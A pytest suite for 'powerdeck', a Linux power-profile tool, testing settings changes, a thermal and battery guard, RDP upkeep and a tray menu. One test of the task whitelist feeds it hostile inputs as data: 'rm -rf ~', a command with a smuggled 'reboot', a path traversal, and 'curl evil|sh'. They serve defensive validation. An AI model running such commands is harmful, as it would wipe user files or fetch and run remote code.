import pytest

from powerdeck import backends, engine, guard, helper
from powerdeck.builtin import BUILTIN_PROFILES
from powerdeck.capture import capture_current
from powerdeck.profile import Profile, ProfileError, parse_task
from powerdeck import status

BY = {p.name: p for p in BUILTIN_PROFILES}


class Fake:
    def __init__(self):
        self.gs = {"idle-delay": "uint32 300", "lock-enabled": "false", "lock-delay": "uint32 0",
                   "night-light-enabled": "true",
                   "sleep-inactive-battery-type": "'suspend'", "sleep-inactive-ac-type": "'suspend'"}
        self.nm = {"Tel": ["no", "0"]}
        self.bt_blocked = False
        self.bright = 80
        self.mode = "balanced"
        self.calls = []

    def __call__(self, a):
        self.calls.append(a)
        if a[0] == "gsettings":
            if a[1] == "get":
                return 0, self.gs[a[3]]
            self.gs[a[3]] = a[4]; return 0, ""
        if a[0] == "nmcli" and a[1] == "-g":
            return (0, "\n".join(self.nm[a[-1]])) if a[-1] in self.nm else (10, "")
        if a[0] == "nmcli" and a[1] == "connection":
            self.nm[a[3]] = [a[5], a[7]]; return 0, ""
        if a[0] == "rfkill":
            if a[1] == "list":
                return 0, f"0: hci0: Bluetooth\n\tSoft blocked: {'yes' if self.bt_blocked else 'no'}"
            self.bt_blocked = a[1] == "block"; return 0, ""
        if a[0] == "brightnessctl":
            if a[1] == "-m":
                return 0, f"intel,backlight,{self.bright},{self.bright}%,100"
            self.bright = int(a[2].rstrip("%")); return 0, ""
        if a[0] == "powerprofilesctl":
            if a[1] == "get":
                return 0, self.mode
            self.mode = a[2]; return 0, ""
        if a[0] in ("systemctl", "notify-send", "pkexec", backends.HELPER_PATH):
            return 0, ""
        return 127, ""


@pytest.fixture(autouse=True)
def env(monkeypatch, tmp_path):
    monkeypatch.setattr(helper, "DROPIN_DIR", str(tmp_path / "l"))
    monkeypatch.setattr(backends, "helper_installed", lambda: True)


def test_tethering_display_bluetooth_roundtrip(tmp_path):
    f = Fake()
    p = Profile(name="T", tethering={"connection": "Tel", "priority": 100},
                display={"blank_after_minutes": 1, "lock_after_minutes": 5, "night_light": False, "brightness_percent": 40},
                bluetooth=False)
    plan = engine.make_plan(p, f)
    txt = plan.diff_text()
    for s in ("Tethering autoconnect [Tel]: no/prio 0 → yes/prio 100", "Screen blank delay (s): 300 → 60",
              "Lock delay after blank (s): 0 → 240", "Night light: true → false", "Brightness (%): 80 → 40",
              "Bluetooth: on → off"):
        assert s in txt, s
    assert engine.apply_plan(plan, f, tmp_path / "b", tmp_path / "a.json") == []
    assert f.nm["Tel"] == ["yes", "100"] and f.bright == 40 and f.bt_blocked
    assert engine.restore_last(f, tmp_path / "b") == []
    assert f.nm["Tel"] == ["no", "0"] and f.bright == 80 and not f.bt_blocked and f.gs["idle-delay"] == "300"


def test_missing_tools_are_skipped():
    plan = engine.make_plan(BY["BatterySaver"], lambda a: (127, ""))
    assert [c for c in plan.changes if c.backend != "logind"] == []


def test_tasks_whitelist():
    assert parse_task("systemctl --user start claude-session.service")
    for bad in ("rm -rf ~", "systemctl start x.service", "systemctl --user start x.service; reboot",
                "systemctl --user enable x.service", "systemctl --user start ../x"):
        with pytest.raises(ProfileError):
            parse_task(bad)
    with pytest.raises(ProfileError):
        Profile(name="Bad", tasks={"on_activate": ["curl evil|sh"]}).validate()


def test_tasks_activate_deactivate_and_revert(tmp_path):
    f = Fake()
    a = Profile(name="A", tasks={"on_activate": ["systemctl --user start x.service"],
                                 "on_deactivate": ["systemctl --user stop x.service"]})
    b = Profile(name="B")
    plan = engine.make_plan(b, f, previous=a)
    assert "On leaving A: stop x.service" in plan.diff_text()
    assert engine.make_plan(a, f, previous=b).changes[0].revert_argv[3] == "x.service"
    assert plan.changes[0].revert_argv == []          # irreversible, skipped on restore
    assert engine.apply_plan(plan, f, tmp_path / "b", tmp_path / "a.json") == []
    assert engine.restore_last(f, tmp_path / "b") == []


def test_guard_events_only_on_worsening():
    p = BY["RemoteWork"]
    st = guard.GuardState()
    st, ev = guard.evaluate(70, 80, "Discharging", p, st); assert ev == []
    st, ev = guard.evaluate(86, 80, "Discharging", p, st); assert ev == ["warn"]
    st, ev = guard.evaluate(87, 80, "Discharging", p, st); assert ev == []      # no spam
    st, ev = guard.evaluate(93, 80, "Discharging", p, st); assert ev == [] and st.critical_pending
    st, ev = guard.evaluate(93, 80, "Discharging", p, st); assert ev == ["critical"]  # confirmed
    st, ev = guard.evaluate(94, 80, "Discharging", p, st); assert ev == []      # suspended once, no loop
    st, ev = guard.evaluate(60, 80, "Discharging", p, st); assert ev == [] and st.thermal == "ok"
    st, ev = guard.evaluate(86, 80, "Discharging", p, st); assert ev == ["warn"]  # re-arms after cooling
    st, ev = guard.evaluate(60, 10, "Discharging", p, st); assert ev == ["low_battery"]
    st, ev = guard.evaluate(60, 9, "Discharging", p, st); assert ev == []
    _, ev = guard.evaluate(95, 5, "Discharging", BY["Default"], guard.GuardState()); assert ev == []


def test_guard_critical_notifies_then_suspends(monkeypatch):
    f = Fake()
    monkeypatch.setattr(guard.time, "sleep", lambda s: f.calls.append(["sleep", s]))
    monkeypatch.setattr(guard, "read_status", lambda run: status.Status(50, "Discharging", 95, None, None))
    monkeypatch.setattr(engine, "active_profile", lambda: "RemoteWork")
    st = guard.run_once(guard.GuardState(), f, {"RemoteWork": BY["RemoteWork"]})
    assert st.critical_pending and ["systemctl", "suspend"] not in f.calls   # first reading: confirm
    f.calls.clear()
    guard.run_once(st, f, {"RemoteWork": BY["RemoteWork"]})
    names = [c[0] for c in f.calls if c[0] in ("notify-send", "sleep", "systemctl")]
    assert names == ["notify-send", "sleep", "systemctl"]          # tell first, then wait, then sleep
    note = next(c for c in f.calls if c[0] == "notify-send")
    assert "maximum temperature" in note[-2] and "92" in note[-1]
    assert ["systemctl", "suspend"] in f.calls
    assert f.mode == "balanced"                                     # no power-saver switch any more

def test_capture_current_profile():
    f = Fake()
    f.gs["sleep-inactive-ac-type"] = "'nothing'"
    p = capture_current(f)
    assert p.automatic_suspend == {"battery": True, "ac": False} and p.power_mode == "balanced"
    assert p.lid == {"battery": "suspend", "ac": "suspend", "docked": "suspend"}


def test_status_battery_temp_and_wifi(tmp_path):
    root = tmp_path / "ps"
    for n, cap, st in (("BAT0", 80, "Discharging"), ("BAT1", 60, "Full")):
        (root / n).mkdir(parents=True)
        (root / n / "capacity").write_text(str(cap)); (root / n / "status").write_text(st)
    assert status.read_battery(str(root)) == (70, "Discharging")
    th = tmp_path / "th"
    for n, typ, t in (("thermal_zone0", "acpitz", 50000), ("thermal_zone1", "x86_pkg_temp", 71000),
                      ("thermal_zone2", "iwlwifi", 99000)):
        (th / n).mkdir(parents=True)
        (th / n / "type").write_text(typ); (th / n / "temp").write_text(str(t))
    assert status.read_cpu_temp(str(th)) == 71.0        # ignores the hot wifi zone
    def run(a):
        if a[:2] == ["iw", "dev"] and len(a) == 2:
            return 0, "phy#0\n\tInterface wlp3s0\n"
        return 0, "Power save: off"
    assert status.read_wifi_powersave(run) == "off"


def test_all_builtin_profiles_valid():
    assert {"Default", "RemoteWork", "Travel", "Rucksack", "BatterySaver", "Max Performance", "Presentation"} <= set(BY)
    for p in BUILTIN_PROFILES:
        p.validate()


def test_remote_profiles_disable_screen_lock_and_others_restore_it():
    # gsd-power locks on lid close and GNOME Shell drops RDP while locked
    f = Fake()
    f.gs["lock-enabled"] = "true"
    for name in ("RemoteWork", "Travel", "Rucksack"):
        ch = [c for c in engine.make_plan(BY[name], f).changes if c.target == "Screen lock enabled"]
        assert [(c.old, c.new) for c in ch] == [("true", "false")], name
    f.gs["lock-enabled"] = "false"
    for name in ("Default", "BatterySaver", "Max Performance"):
        ch = [c for c in engine.make_plan(BY[name], f).changes if c.target == "Screen lock enabled"]
        assert [(c.old, c.new) for c in ch] == [("false", "true")], name


def test_lock_screen_validation():
    import pytest
    from powerdeck.profile import Profile, ProfileError
    with pytest.raises(ProfileError):
        Profile(name="X", display={"lock_screen": "no"}).validate()
    with pytest.raises(ProfileError):
        Profile(name="X", display={"lock_screen": False, "lock_after_minutes": 5}).validate()


def test_capture_includes_screen_lock():
    f = Fake()
    f.gs["lock-enabled"] = "true"
    assert capture_current(f).display == {"lock_screen": True}


class ScreenSaverBus:
    """Fake runner for org.gnome.ScreenSaver over gdbus (plus a quiet status read)."""

    def __init__(self, active):
        self.active, self.calls = active, []

    def __call__(self, a):
        self.calls.append(a)
        if a[0] == "gdbus" and a[-1] == "org.gnome.ScreenSaver.GetActive":
            return 0, f"({str(self.active).lower()},)"
        if a[0] == "gdbus" and a[-2] == "org.gnome.ScreenSaver.SetActive":
            self.active = a[-1] == "true"; return 0, "()"
        return 127, ""


def _remote_profiles(tmp_path, name="Travel"):
    active = tmp_path / "state" / "powerdeck" / "active.json"
    active.parent.mkdir(parents=True, exist_ok=True)
    active.write_text('{"profile": "%s"}' % name)
    return {p.name: p for p in BUILTIN_PROFILES}


def test_guard_dismisses_screensaver_only_for_remote_profiles(tmp_path):
    profiles = _remote_profiles(tmp_path)
    bus = ScreenSaverBus(active=True)
    assert guard.on_monitor_line("/org/gnome/ScreenSaver: org.gnome.ScreenSaver.ActiveChanged (true,)", bus, profiles)
    assert bus.active is False
    bus.active = True
    assert not guard.on_monitor_line("/org/gnome/ScreenSaver: org.gnome.ScreenSaver.ActiveChanged (false,)", bus, profiles)
    _remote_profiles(tmp_path, "Default")
    assert not guard.on_monitor_line("/org/gnome/ScreenSaver: org.gnome.ScreenSaver.ActiveChanged (true,)", bus, profiles)
    assert bus.active is True          # Default: GNOME's normal screensaver/lock is left alone


def test_guard_poll_dismisses_screensaver_as_fallback(tmp_path):
    profiles = _remote_profiles(tmp_path, "RemoteWork")
    bus = ScreenSaverBus(active=True)
    guard.run_once(guard.GuardState(), bus, profiles)
    assert bus.active is False


def test_remote_profiles_never_idle_blank_and_need_unlocked_screen():
    for name in ("RemoteWork", "Travel", "Rucksack"):
        p = BY[name]
        assert p.remote_access and p.display["lock_screen"] is False and p.display["blank_after_minutes"] == 0
    with pytest.raises(ProfileError):
        Profile(name="X", remote_access=True).validate()
    with pytest.raises(ProfileError):
        Profile(name="X", remote_access="yes", display={"lock_screen": False}).validate()


def test_read_remote_login():
    calls = []
    def run(out, rc=0):
        return lambda a: (calls.append(a), (rc, out))[1]
    assert status.read_remote_login(run("enabled\n")) == "enabled"
    assert status.read_remote_login(run("disabled\n", 1)) == "disabled"
    assert status.read_remote_login(run("masked\n", 1)) == "disabled"
    assert status.read_remote_login(run("not-found\n", 4)) is None
    assert status.read_remote_login(run("", 127)) is None
    assert calls[0] == ["systemctl", "is-enabled", "gnome-remote-desktop.service"]


def test_remote_login_check_never_asks_for_a_password():
    # grdctl --system re-runs itself via pkexec: an admin password dialog popped up during
    # `powerdeck status` / `plan` (seen on the laptop while connected over RDP)
    calls = []
    run = lambda a: (calls.append(a), (0, "enabled\n"))[1]
    status.read_status(run, remote_login=True)
    guard.remote_access_notes(run)
    assert calls and not any(c[0] in ("grdctl", "pkexec", "sudo") for c in calls)


def test_remote_access_notes():
    def run(state, login):
        return lambda a: ((0, login) if a[:2] == ["systemctl", "is-enabled"]
                          else (0, state) if a[0] == "systemctl" else (1, ""))
    assert guard.remote_access_notes(run("active", "enabled")) == []
    notes = guard.remote_access_notes(run("inactive", "disabled"))
    assert len(notes) == 2 and "guard is not running" in notes[0] and "Remote Login" in notes[1]
    manual = lambda a: (0, "inactive") if a[0] == "systemctl" else (0, "123") if a[0] == "pgrep" else (0, "")
    assert not any("guard" in n for n in guard.remote_access_notes(manual))   # `powerdeck guard` by hand


def test_remote_access_notes_warn_when_rdp_port_is_closed():
    """gnome-remote-desktop had moved to 3390; the phone kept trying 3389 ("PC not found")."""
    def run(listen):
        def r(a):
            if a[0] == "ss":
                assert a == ["ss", "-Htln", "sport = :3389"]
                return listen
            return (0, "enabled") if a[:2] == ["systemctl", "is-enabled"] else (0, "active")
        return r
    listening = (0, "LISTEN 0 5 *:3389 *:*\n")
    assert guard.rdp_listening(run(listening)) is True
    assert guard.remote_access_notes(run(listening)) == []
    notes = guard.remote_access_notes(run((0, "")))
    assert len(notes) == 1 and "3389" in notes[0] and "restart gnome-remote-desktop" in notes[0]
    assert guard.rdp_listening(run((127, ""))) is None
    assert guard.remote_access_notes(run((127, ""))) == []      # no ss: no false alarm


def test_guard_ignores_a_short_critical_spike():
    """Bag test 2026-11-16: one 84 °C reading at the start of a load suspended Rucksack."""
    p, st = BY["Rucksack"], guard.GuardState()          # critical 82 °C
    st, ev = guard.evaluate(84, 99, "Discharging", p, st)
    assert ev == ["warn"] and st.critical_pending       # notified, not suspended
    st, ev = guard.evaluate(70, 99, "Discharging", p, st)
    assert ev == [] and not st.critical_pending and st.thermal == "warn"
    st, ev = guard.evaluate(84, 99, "Discharging", p, st)
    assert ev == [] and st.critical_pending             # a new spike needs a new confirmation


def test_guard_suspends_at_once_far_above_critical():
    p = BY["Rucksack"]
    _, ev = guard.evaluate(82 + guard.CRITICAL_IMMEDIATE_MARGIN, 99, "Discharging", p, guard.GuardState())
    assert ev == ["critical"]
    _, ev = guard.evaluate(82 + guard.CRITICAL_IMMEDIATE_MARGIN - 1, 99, "Discharging", p, guard.GuardState())
    assert ev == ["warn"]


def test_guard_low_battery_only_on_battery_in_lid_ignore_profiles():
    for name in ("RemoteWork", "Travel", "Rucksack"):
        _, ev = guard.evaluate(50, guard.LOW_BATTERY_PERCENT, "Discharging", BY[name], guard.GuardState())
        assert ev == ["low_battery"], name
    for name in ("Default", "BatterySaver", "Presentation", "Max Performance"):
        _, ev = guard.evaluate(50, 5, "Discharging", BY[name], guard.GuardState())
        assert "low_battery" not in ev, name
    p = BY["Rucksack"]
    for pct, state in ((16, "Discharging"), (10, "Charging"), (10, "Fully charged"), (None, "Discharging")):
        _, ev = guard.evaluate(50, pct, state, p, guard.GuardState())
        assert ev == [], (pct, state)
    _, ev = guard.evaluate(50, 10, "Discharging", None, guard.GuardState())
    assert ev == []                                     # no PowerDeck profile active


def test_guard_low_battery_suspends_once(monkeypatch):
    f = Fake()
    monkeypatch.setattr(guard.time, "sleep", lambda s: f.calls.append(["sleep", s]))
    monkeypatch.setattr(guard, "read_status", lambda run: status.Status(15, "Discharging", 50, None, None))
    monkeypatch.setattr(engine, "active_profile", lambda: "Rucksack")
    profiles = {"Rucksack": BY["Rucksack"]}
    st = guard.run_once(guard.GuardState(), f, profiles)
    names = [c[0] for c in f.calls if c[0] in ("notify-send", "sleep", "systemctl")]
    assert names == ["notify-send", "sleep", "systemctl"] and ["systemctl", "suspend"] in f.calls
    note = next(c for c in f.calls if c[0] == "notify-send")
    assert "battery low" in note[-2] and "15 %" in note[-1]
    f.calls.clear()
    guard.run_once(st, f, profiles)                     # woken up by the user at 15 %: stay awake
    assert ["systemctl", "suspend"] not in f.calls


def test_guard_low_battery_rearms_only_after_recovery():
    p = BY["Rucksack"]
    st, ev = guard.evaluate(50, 15, "Discharging", p, guard.GuardState()); assert ev == ["low_battery"]
    for pct, state in ((None, "Discharging"), (14, "Unknown"), (17, "Discharging"), (14, "Discharging")):
        st, ev = guard.evaluate(50, pct, state, p, st)
        assert ev == [] and st.low_battery_notified, (pct, state)   # odd readings after resume: no loop
    st, ev = guard.evaluate(50, 14, "Charging", p, st); assert ev == [] and not st.low_battery_notified
    st, ev = guard.evaluate(50, 14, "Discharging", p, st); assert ev == ["low_battery"]  # unplugged again
    st, ev = guard.evaluate(50, 19, "Discharging", p, st); assert not st.low_battery_notified


def test_guard_suspend_falls_back_to_helper_when_inhibited(monkeypatch, tmp_path):
    helper_path = tmp_path / "powerdeck-suspend"
    helper_path.write_text("#!/bin/sh\n"); helper_path.chmod(0o755)
    monkeypatch.setattr(guard, "SUSPEND_HELPER", str(helper_path))
    calls = []
    def run(a):
        calls.append(a)
        if a == ["systemctl", "suspend"]:
            return 1, "Operation inhibited by \"Claude\""
        return 0, ""
    assert guard.critical_reaction(run, 90, 88, sleep=lambda s: None) is True
    assert ["pkexec", str(helper_path)] in calls


def test_guard_reports_when_suspend_impossible(monkeypatch, tmp_path):
    monkeypatch.setattr(guard, "SUSPEND_HELPER", str(tmp_path / "missing"))
    calls = []
    def run(a):
        calls.append(a)
        return (1, "denied") if a[0] == "systemctl" else (0, "")
    assert guard.critical_reaction(run, 90, 88, sleep=lambda s: None) is False
    notes = [c for c in calls if c[0] == "notify-send"]
    assert len(notes) == 2 and "could not suspend" in notes[1][-2]



def _two_applies(tmp_path):
    """Default → RemoteWork-like → stricter: two backups, newest must be undone first."""
    f = Fake()
    p1 = Profile(name="A", lid={"battery": "ignore", "ac": "ignore", "docked": "ignore"},
                 display={"blank_after_minutes": 0}, tethering={"connection": "Tel", "priority": 100})
    p2 = Profile(name="B", display={"blank_after_minutes": 1}, bluetooth=False)
    for p in (p1, p2):
        assert engine.apply_plan(engine.make_plan(p, f), f, tmp_path / "b", tmp_path / "a.json") == []
    return f


def test_reset_all_restores_pre_powerdeck_state(tmp_path):
    f = _two_applies(tmp_path)
    assert f.gs["idle-delay"] == "60" and f.bt_blocked and f.nm["Tel"] == ["yes", "100"]
    assert engine.reset_all(f, tmp_path / "b", active_file=tmp_path / "a.json") == []
    assert f.gs["idle-delay"] == "300" and not f.bt_blocked and f.nm["Tel"] == ["no", "0"]
    assert ["pkexec", backends.HELPER_PATH, "remove-lid"] in f.calls
    assert not list((tmp_path / "b").glob("*.json")) and not (tmp_path / "a.json").exists()
    assert engine.reset_all(f, tmp_path / "b") == []            # second run: nothing left to do


def test_reset_all_split_into_root_and_user_passes(tmp_path):
    f = _two_applies(tmp_path)
    n = len(f.calls)
    assert engine.reset_all(f, tmp_path / "b", only="system", mark_restored=False) == []
    system_calls = f.calls[n:]
    assert all(c[0] != "gsettings" for c in system_calls)
    assert [backends.HELPER_PATH, "remove-lid"] in system_calls     # root: no pkexec
    assert f.gs["idle-delay"] == "60" and not f.bt_blocked           # gsettings untouched yet
    assert list((tmp_path / "b").glob("*.json"))                     # kept for the user pass
    n = len(f.calls)
    assert engine.reset_all(f, tmp_path / "b", only="user", active_file=tmp_path / "a.json") == []
    assert all(c[0] == "gsettings" for c in f.calls[n:])
    assert f.gs["idle-delay"] == "300"


def test_reset_all_continues_after_errors(tmp_path):
    f = _two_applies(tmp_path)
    def flaky(a):
        if a[0] == "rfkill":
            return 1, "rfkill: blocked by policy"
        return f(a)
    errs = engine.reset_all(flaky, tmp_path / "b", active_file=tmp_path / "a.json")
    assert errs == ["Bluetooth: rfkill: blocked by policy"]
    assert f.gs["idle-delay"] == "300"                               # the rest still reverted


def test_monitor_thermal_level_uses_active_profile_limits():
    assert status.profile_thermal_level(75, BY["Rucksack"]) == "warn"       # 70/82
    assert status.profile_thermal_level(83, BY["Rucksack"]) == "critical"
    assert status.profile_thermal_level(83, BY["RemoteWork"]) == "ok"       # 85/92
    assert status.profile_thermal_level(83, BY["Default"]) == "ok"          # no guard: defaults
    assert status.profile_thermal_level(86, None) == "warn"
    assert status.profile_thermal_level(None, BY["Rucksack"]) == "unknown"


def test_remote_login_only_queried_where_its_value_is_used(tmp_path):
    calls = []
    run = lambda a: (calls.append(a), (1, ""))[1]
    status.read_status(run)
    guard.run_once(guard.GuardState(), run, _remote_profiles(tmp_path, "RemoteWork"))
    assert calls and not any(status.REMOTE_LOGIN_UNIT in c for c in calls)
    s = status.read_status(lambda a: (0, "enabled\n") if status.REMOTE_LOGIN_UNIT in a else (1, ""),
                           remote_login=True)
    assert s.remote_login == "enabled"


class RdpHost:
    """ss / gsettings / systemctl --user restart for gnome-remote-desktop."""
    def __init__(self, listening=False, enabled="true"):
        self.listening, self.enabled, self.restarts = listening, enabled, 0

    def __call__(self, a):
        if a[0] == "ss":
            return 0, "LISTEN 0 5 *:3389 *:*\n" if self.listening else ""
        if a[:2] == ["gsettings", "get"]:
            assert a[2:] == ["org.gnome.desktop.remote-desktop.rdp", "enable"]
            return 0, self.enabled + "\n"
        if a == ["systemctl", "--user", "restart", "gnome-remote-desktop"]:
            self.restarts += 1
            return 0, ""
        raise AssertionError(a)


def test_guard_restarts_rdp_when_port_closed():
    host, st = RdpHost(), guard.GuardState()
    assert not guard.keep_rdp_listening(host, st, 0)        # one closed poll: maybe still starting
    assert guard.keep_rdp_listening(host, st, 30) and host.restarts == 1
    assert not guard.keep_rdp_listening(host, st, 60)       # give it time to come up
    assert guard.keep_rdp_listening(host, st, 30 + guard.RDP_RESTART_EVERY_S) and host.restarts == 2
    host.listening = True
    assert not guard.keep_rdp_listening(host, st, 2000) and st.rdp_restarts == 0


def test_guard_rdp_restart_gives_up_and_respects_disabled_sharing():
    host, st = RdpHost(), guard.GuardState()
    for i in range(20):
        guard.keep_rdp_listening(host, st, i * guard.RDP_RESTART_EVERY_S)
    assert host.restarts == guard.RDP_MAX_RESTARTS             # no endless restart loop
    off = RdpHost(enabled="false")
    st = guard.GuardState()
    for i in range(5):
        guard.keep_rdp_listening(off, st, i * guard.RDP_RESTART_EVERY_S)
    assert off.restarts == 0                                     # sharing turned off on purpose
    assert not guard.keep_rdp_listening(lambda a: (127, ""), guard.GuardState(), 0)  # no ss


def test_guard_state_survives_evaluate():
    st = guard.GuardState(rdp_closed_ticks=1, rdp_restarts=2, rdp_last_restart=5.0)
    new, _ = guard.evaluate(50, 80, "Discharging", BY["Rucksack"], st)
    assert (new.rdp_closed_ticks, new.rdp_restarts, new.rdp_last_restart) == (1, 2, 5.0)


def test_guard_poll_restarts_rdp_only_for_remote_profiles(monkeypatch, tmp_path):
    monkeypatch.setattr(guard, "read_status", lambda run: status.Status(80, "Discharging", 50, None, None))
    monkeypatch.setattr(guard, "dismiss_screensaver", lambda run: False)
    for name, want in (("Rucksack", 1), ("Default", 0)):
        monkeypatch.setattr(engine, "active_profile", lambda n=name: n)
        host = RdpHost()
        st = guard.GuardState()
        for _ in range(2):
            st = guard.run_once(st, host, {p.name: p for p in BUILTIN_PROFILES})
        assert host.restarts == want, name


# -- top-bar icon -------------------------------------------------------------
import pathlib  # noqa: E402

from powerdeck import tray  # noqa: E402

ROOT = pathlib.Path(__file__).resolve().parent.parent


def _tray(active="Travel", calls=None):
    calls = [] if calls is None else calls
    t = tray.Tray(lambda: (["Default", "Travel"], active), lambda: calls.append("open"),
                  lambda n: calls.append(("profile", n)), lambda: calls.append("restore"),
                  lambda: calls.append("quit"))
    return t, calls


def test_tray_menu_lists_profiles_with_the_active_one_checked():
    items = tray.menu_items(["Default", "Travel"], "Travel")
    labels = [p.get("label") for _i, p in items]
    assert labels[0] == tray._("Open PowerDeck") and labels[-1] == tray._("Quit PowerDeck (back to Default)")
    radios = {p["label"]: p["toggle-state"] for _i, p in items if p.get("toggle-type") == "radio"}
    assert radios == {"Default": 0, "Travel": 1}
    restore = next(p for i, p in items if i == tray.RESTORE_ID)
    assert restore["enabled"] is True
    assert next(p for i, p in tray.menu_items(["Default"], None) if i == tray.RESTORE_ID)["enabled"] is False


def test_tray_layout_is_valid_dbusmenu():
    t, _calls = _tray()
    rev, (root, props, children) = t.layout().unpack()
    assert root == 0 and props["children-display"] == "submenu" and len(children) == 7
    ids = [c[0] for c in children]
    assert len(set(ids)) == len(ids) and all(i > 0 for i in ids)   # separators get ids too
    assert t.layout().get_type_string() == "(u(ia{sv}av))"


def test_tray_clicks_reach_the_app(monkeypatch):
    monkeypatch.setattr(tray.GLib, "idle_add", lambda fn, *a: fn(*a))
    t, calls = _tray()
    t.layout()                                      # menu shown: profiles known
    for item in (tray.OPEN_ID, tray.PROFILE_BASE + 1, tray.RESTORE_ID, tray.QUIT_ID, 10_001, 999):
        t.clicked(item)
    assert calls == ["open", ("profile", "Travel"), "restore", "quit"]   # separator / unknown: nothing


def test_tray_title_shows_the_active_profile():
    t, _ = _tray("Rucksack")
    assert t._item_prop(None, None, None, None, "Title").unpack() == "PowerDeck — Rucksack"
    assert t._item_prop(None, None, None, None, "Menu").unpack() == tray.MENU_PATH
    assert t._item_prop(None, None, None, None, "ItemIsMenu").unpack() is False   # click = open


def test_tray_without_a_watcher_is_off():
    class Bus:
        def call_sync(self, *a):
            return tray.GLib.Variant("(b)", (False,))
    t, _ = _tray()
    assert t.start(Bus()) is False                  # the app then quits on close as before


def test_guard_starts_with_the_graphical_session():
    unit = (ROOT / "data/powerdeck-guard.service").read_text()
    assert "WantedBy=graphical-session.target" in unit and "ConditionUser=!@system" in unit
    deb = (ROOT / "scripts/stage.sh").read_text()
    assert "graphical-session.target.wants/powerdeck-guard.service" in deb
    auto = (ROOT / "data/io.github.powerdeck.PowerDeck-autostart.desktop").read_text()
    assert "Exec=powerdeck-gtk --background" in auto and "TryExec=powerdeck-gtk" in auto


def test_active_profile_ignores_a_non_string(tmp_path):
    f = tmp_path / "active.json"
    for bad in ('{"profile": 5}', '{"profile": ["a"]}', '[1]', "{"):
        f.write_text(bad)
        assert engine.active_profile(f) is None
    f.write_text('{"profile": "Travel"}')
    assert engine.active_profile(f) == "Travel"


def test_guard_notices_are_translated(monkeypatch):
    monkeypatch.setenv("LANG", "sk_SK.UTF-8")
    calls = []
    run = lambda a: (calls.append(a), (0, ""))[1]
    guard.low_battery_reaction(run, 15, sleep=lambda s: None)
    note = next(c for c in calls if c[0] == "notify-send")
    assert note[-2] == "PowerDeck: uspávam – slabá batéria" and "15 %" in note[-1]
